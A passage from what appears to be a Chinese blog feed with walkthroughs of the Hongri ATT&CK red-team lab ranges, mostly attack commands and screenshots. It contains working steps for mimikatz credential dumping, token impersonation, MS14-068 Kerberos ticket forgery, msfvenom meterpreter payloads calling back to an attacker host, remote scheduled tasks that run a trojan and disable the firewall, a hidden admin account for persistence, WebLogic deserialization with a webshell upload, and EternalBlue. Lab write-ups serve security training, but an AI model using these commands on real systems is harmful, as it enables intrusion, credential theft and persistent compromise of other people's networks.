src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921165308761.png" alt="image-20230921165308761" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921165911225.png" alt="image-20230921165911225" style="zoom:67%;"><p>提示提权不够无法提取</p><p>使用exit回到<strong>meterpreter</strong>里面使用令牌窃取<strong>SYSTEM</strong>权限之后再进行<strong>mimikatz</strong>密码进行抓取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921170952452.png" alt="image-20230921170952452" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>成功抓取到密码</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921171313204.png" alt="image-20230921171313204" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921171235980.png" alt="image-20230921171235980" style="zoom:67%;"><h4 id="域横向移动"><a href="#域横向移动" class="headerlink" title="域横向移动"></a>域横向移动</h4><h5 id="利用Kerberos-域用户提权漏洞获得域控WIN2008"><a href="#利用Kerberos-域用户提权漏洞获得域控WIN2008" class="headerlink" title="利用Kerberos 域用户提权漏洞获得域控WIN2008"></a>利用Kerberos 域用户提权漏洞获得域控WIN2008</h5><p>拿到了域成员的帐号和密码后，直接使用一个<strong>ptt</strong>伪造票据来拿到域控权限，利用<strong>mimikatz</strong>注入票据。 </p><p> 生成一个高权限票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">ms14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922152504491.png" alt="image-20230922152504491" style="zoom:67%;"><p>在注入之前先查看注入前的权限，此时发现权限不够</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921212011213.png" alt="image-20230921212011213" style="zoom:67%;"><p>清除内存中的所有票据：</p><p>打开mimikatz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">当看到&quot;Ticket(s) purge for current session is OK&#x27;时，表示清除成功</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921212456107.png" alt="image-20230921212456107" style="zoom:67%;"><p>将高权限的票据注入内存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br><span class="line">kerberos::ptc &quot;TGT_user1@pentest.com.ccache&quot;（双引号里面的是票据的名字）</span><br><span class="line">kerberos::ptc &quot;TGT_douser@DEMO.com.ccache&quot;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921212756129.png" alt="image-20230921212756129" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921213732131.png" alt="image-20230921213732131" style="zoom:67%;"><p>注入票据后再次查看权限，能够成功的查取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230921213839688.png" alt="image-20230921213839688" style="zoom:67%;"><p>能够成功的查看另一台主机<code>Windows server2008</code>的目录信息</p><h5 id="上传msf马到域控"><a href="#上传msf马到域控" class="headerlink" title="上传msf马到域控"></a>上传msf马到域控</h5><p>在<strong>kali</strong>中生成一个正向连接的木马文件，上传到<code>Windows server2008</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lhost=192.168.111.128 lport=9900 -f exe &gt; 9900.exe</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922153512474.png" alt="image-20230922153512474" style="zoom:67%;"><p>由于无法直接访问主机Windows server2008，先上传到win7中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/bamboo/桌面/9900.exe C:\\</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922154348709.png" alt="image-20230922154348709" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922155011082.png" alt="image-20230922155011082" style="zoom:67%;"><p>再通过win7上传到Windows server 2008中</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922160002791.png" alt="image-20230922160002791" style="zoom:67%;"><p>木马上传成功后，创建服务执行木马文件，并用msf接受会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922163721242.png" alt="image-20230922163721242" style="zoom:67%;"><p>复现时遇到报错</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922163801315.png" alt="image-20230922163801315" style="zoom:67%;"><p>发现我的配置文件有两个，一个<code>/etc/proxychains.conf</code>，一个<code>/etc/proxychains4.conf</code>，查了一下，<strong>proxychains</strong>4以上的版本的配置文件名叫<code>/etc/proxychains4.conf</code>，于是把<code>/etc/proxychains.conf</code>删了，解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.130</span><br><span class="line">set lport 9900</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>使用copy命令复制到DC上后使用sc创建计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;test&quot; /tr C:\Users\Desktop\9900.exe /sc MINUTE /S 192.168.183.130</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922164655525.png" alt="image-20230922164655525" style="zoom: 67%;"><p>使用sc关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922164710579.png" alt="image-20230922164710579" style="zoom:67%;"><p>创建服务站执行msf马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /S WIN-ENS2VR5TR3N /TN &quot;test1&quot; /TR C:\9900.exe /SC MINUTE /MO 1 /ru system /f /RP</span><br><span class="line"></span><br><span class="line">echo netsh advfirewall set allprofiles state off &gt;1.bat</span><br><span class="line">copy C:\\1.bat \\WIN-ENS2VR5TR3N\c$\</span><br><span class="line">schtasks /create /S WIN-ENS2VR5TR3N /TN &quot;test2&quot; /TR C:\1.bat /SC MINUTE /MO 1 /ru system /f /RP</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922171752234.png" alt="image-20230922171752234" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922171648746.png" alt="image-20230922171648746" style="zoom:67%;"><p><strong>msf</strong>收到shell</p><h5 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h5><p>上面查看系统信息发现这台主机也没有打KB3011780的补丁，上传mimikatz进行抓取密码</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922172139657.png" alt="image-20230922172139657" style="zoom:67%;"><p>可以看到<strong>mimikatz</strong>被上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922172224094.png" alt="image-20230922172224094" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922172429713.png" alt="image-20230922172429713" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922173750611.png" alt="image-20230922173750611" style="zoom:67%;"><p>密码：Test2023</p><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>这里拿到域管用户之后可以使用金票进行权限维持，这里我就简单的添加一个隐藏用户进行权限维持,再使用<code>net user</code>是看不到这个隐藏用户的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ qaz123!@# /add#添加用户admin$</span><br><span class="line">net localgroup administrators admin$ /add#将admin$用户添加到管理员组administrators</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230922174621344.png" alt="image-20230922174621344" style="zoom:67%;">]]></content>
      
      
      <categories>
          
          <category> 渗透打靶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场二</title>
      <link href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
      <url>/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="ATT-CK红队评估二"><a href="#ATT-CK红队评估二" class="headerlink" title="ATT&amp;CK红队评估二"></a>ATT&amp;CK红队评估二</h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>先在VMware中编辑虚拟网络，添加<strong>VMnet2</strong>，进主机模式，子网IP10段</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230829094422144.png" alt="image-20230829094422144" style="zoom: 60%;"><h4 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h4><p>两个网卡</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230829094743773.png" alt="image-20230829094743773" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230829094803199.png" alt="image-20230829094803199" style="zoom:67%;"><h4 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h4><p>一个网卡</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230829094842580.png" alt="image-20230829094842580" style="zoom:67%;"><h4 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h4><p>两个网卡</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230829094912028.png" alt="image-20230829094912028" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230829094926445.png" alt="image-20230829094926445" style="zoom:67%;"><p>三台机器默认密码都为<code>1qaz@WSX</code></p><p>WEB这台机器要先恢复到快照v1.3</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901114935797.png" class title="image-20230901114935797">然后用**.\de1ay : 1qaz@WSX** 登录,会提示修改密码，将密码改为 : **3edc$RFV**<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901203305771.png" alt="image-20230901203305771" style="zoom:85%;"><p>再用<strong>mssql : 1qaz@WSX</strong></p><p>进这个目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\bin</span><br></pre></td></tr></table></figure><p>进去之后进到这个目录下面,无权限时可以输入 管理员账号密码：**.\de1ay : 3edc$RFV**</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901204624784.png" alt="image-20230901204624784" style="zoom:80%;"><p>右键管理员身份运行<strong>startweblogic</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901221512761.png" class title="image-20230901221512761"><table><thead><tr><th>主机</th><th>外网IP</th><th>内网IP</th></tr></thead><tbody><tr><td>kali</td><td>192.168.111.128</td><td>无</td></tr><tr><td>PC.de1ay.com</td><td>192.168.111.201</td><td>10.10.10.201</td></tr><tr><td>DC.de1ay.com</td><td>无</td><td></td></tr><tr><td>WEB.de1ay.com</td><td>192.168.111.80</td><td>10.10.10.80</td></tr></tbody></table><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230903101351867.png" alt="image-20230903101351867" style="zoom:80%;"><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="探测靶机IP"><a href="#探测靶机IP" class="headerlink" title="探测靶机IP"></a>探测靶机IP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-sacn -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901104907738.png" alt="image-20230901104907738" style="zoom:67%;"><p>发现<code>192.168.111.80</code>和<code>192.168.111.201</code>两台机器</p><h4 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -p- 192.168.111.201</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901214530474.png" alt="image-20230901214530474" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -p- 192.168.111.80</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901222226064.png" alt="image-20230901222226064" style="zoom:67%;"><p>端口开启可能存在的服务：</p><ol><li>445端口开放意味着存在smb服务，可能存在ms17_010永恒之蓝漏洞。</li><li>开放139端口，就存在Samba服务，可能存在爆破&#x2F;未授权访问&#x2F;远程命令执行漏洞。</li><li>放1433端口，就存在mssql服务，可能存在爆破&#x2F;注入&#x2F;SA弱口令。</li><li>开放7001端口可能存在Weblogic反序列化漏洞。</li></ol><h4 id="WeblogicScan-扫描"><a href="#WeblogicScan-扫描" class="headerlink" title="WeblogicScan 扫描"></a>WeblogicScan 扫描</h4><p>看到<strong>weblogic</strong>就先来看看是否出有可利用的地方</p><p>访问7001端口，但是没有什么东西</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230901223013057.png" class title="image-20230901223013057"><p>进入后台登陆界面，尝试用工具扫一下</p><p>下载地址：<a href>https://github.com/dr0op/WeblogicScan.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python WeblogicScan.py 192.168.111.80 7001</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230903103034522.png" alt="image-20230903103034522" style="zoom: 67%;"><p>能扫出漏洞、后台路劲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.80:7001/console</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230903110030723.png" alt="image-20230903110030723" style="zoom:80%;"><p>这里<code>CVE-2017-10271</code>可以进行命令执行发现为administrator权限</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906195814532.png" alt="image-20230906195814532" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906195912674.png" alt="image-20230906195912674" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig   可以看到两个网卡</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906195958437.png" alt="image-20230906195958437" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc       查看进程，可以看到有杀软360</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906200050599.png" alt="image-20230906200050599" style="zoom:67%;"><p>发现<strong>CVE-2019-2725</strong>、<strong>CVE-2017-3506</strong>，用Java反序列化工具</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230903112213811.png" alt="image-20230903112213811" style="zoom: 67%;"><p>选择上传文件，将冰蝎自带的<strong>jsp</strong>木马传上去</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230903112705844.png" alt="image-20230903112705844" style="zoom:67%;"><p>冰蝎上线成功</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230903113339463.png" alt="image-20230903113339463" style="zoom:50%;"><p>先尝试命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906202219293.png" alt="image-20230906202219293" style="zoom: 50%;"><h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.111.128 LPORT=1234 -f exe -o /home/bamboo/桌面/hack.exe</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906203247355.png" alt="image-20230906203247355" style="zoom: 67%;"><p>用冰蝎把.exe上传上去</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906203502255.png" alt="image-20230906203502255" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb run</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit -j(后台)允许</span><br></pre></td></tr></table></figure><p>同时执行<strong>hack.exe</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906203904164.png" alt="image-20230906203904164" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906203955439.png" alt="image-20230906203955439" style="zoom:67%;"><p><strong>msf</strong>这边收到<strong>shell</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906214131358.png" alt="image-20230906214131358" style="zoom:67%;"><p><strong>getsystem</strong>不能直接连接</p><p>这里exe文件没有被360杀，具体原因还不知道</p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="socks代理扫描内网"><a href="#socks代理扫描内网" class="headerlink" title="socks代理扫描内网"></a>socks代理扫描内网</h4><p>这里首先添加一个10.10.10.0&#x2F;24段的路由，方便后续操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add 10.10.10.0 255.255.255.0 1</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906204425197.png" alt="image-20230906204425197" style="zoom:67%;"><p>使用<code>socks</code>路由把<code>msf</code>带入内网，需要在<code>proxychains.conf</code>里面添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906205200655.png" alt="image-20230906205200655" style="zoom:67%;"><p><strong>arp</strong>探测内网存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set RHOSTS 10.10.10.0/24</span><br><span class="line">set SESSION 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906221158348.png" alt="image-20230906221158348" style="zoom:67%;"><p>这里使用常规的nmap对这两个ip进行端口扫描发现什么都没有扫出来，那么这里应该是有防火墙的原因</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906213143714.png" alt="image-20230906213143714" style="zoom:67%;"><h4 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h4><p>这里使用<code>ms17-010</code>模块首先对内网进行扫描一下能不能够通过漏洞直接进行横向移动，注意因为有360的原因这里线程不要调的太高</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhost 10.10.10.0/24</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906223547121.png" alt="image-20230906223547121" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906223630039.png" alt="image-20230906223630039" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906223800242.png" alt="image-20230906223800242" style="zoom:67%;"><p>发现有永恒之蓝，poc直接打一波，但是shell弹不回来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 10.10.10.80</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230906225551069.png" alt="image-20230906225551069" style="zoom:67%;"><h4 id="msf派生cs"><a href="#msf派生cs" class="headerlink" title="msf派生cs"></a>msf派生cs</h4><p><code>getuid</code>查看了一下当前的权限发现还只是一个user权限，也使用不了<code>mimikatz</code>，因为在<code>cs</code>上提权比较方便，这里就直接<code>msf</code>派生个对话给<code>cs</code>，在<code>cs</code>上进行提权操作</p><p>使用<code>payload-inject</code>把<code>msf</code>的对话派生给<code>cs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set LHOST 192.168.111.128</span><br><span class="line">set LPORT 5555</span><br><span class="line">set SESSION 2</span><br><span class="line">run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.111.128 1234567</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230907163924220.png" alt="image-20230907163924220" style="zoom: 60%;"><p>但是派生的时候出现了问题，所以我们直接用CS生成钓鱼文件，传上去</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230907170105141.png" alt="image-20230907170105141" style="zoom:67%;"><img 